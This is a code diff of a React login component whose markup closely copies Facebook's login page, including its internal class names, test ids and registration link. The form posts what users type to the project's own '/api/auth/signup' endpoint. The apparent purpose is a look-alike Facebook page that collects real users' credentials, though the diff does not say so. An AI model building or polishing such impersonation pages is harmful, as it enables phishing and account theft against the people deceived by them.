@@ -51,7 +51,7 @@ e.preventDefault()
  try {
 setLoad(true)
 
-    const res = await axios.post(API_URL+'/api/auth/signup', body)
+    const res = await axios.post('/api/auth/signup', body)
 
 
 if(res.data){
@@ -168,8 +168,8 @@ class="inputtext _55r1 _6luy _9npi"
 </div>
 
 <div class="_6ltg pt-3">
-<button  onClick={Login}  value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" 
-name="login" data-testid="royal_login_button" type="submit" id="u_0_d_4K">Log In 
+<button  onClick={Login}  class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" 
+ id="u_0_d_4K">Log In 
 {load &&  
 <span className="spinner-border spinner-border-sm mx-4 text-white " role="status" >
                          </span>}
@@ -186,7 +186,7 @@ name="login" data-testid="royal_login_button" type="submit" id="u_0_d_4K">Log In
 </div></form>
 </div>
 <div id="reg_pages_msg" class="_58mk" >
-<a href="/pages/create/?ref_type=registration_form" style={{
+<a href="http:web.facebook.com/pages/create/?ref_type=registration_form" style={{
   fontFamily:'Helvetica, Arial, sans-serif',
   fontSize:'14px',
   fontWeight:'bold',
@@ -278,5 +278,6 @@ dir="ltr"
 }
 
 export default main;
+
 
 
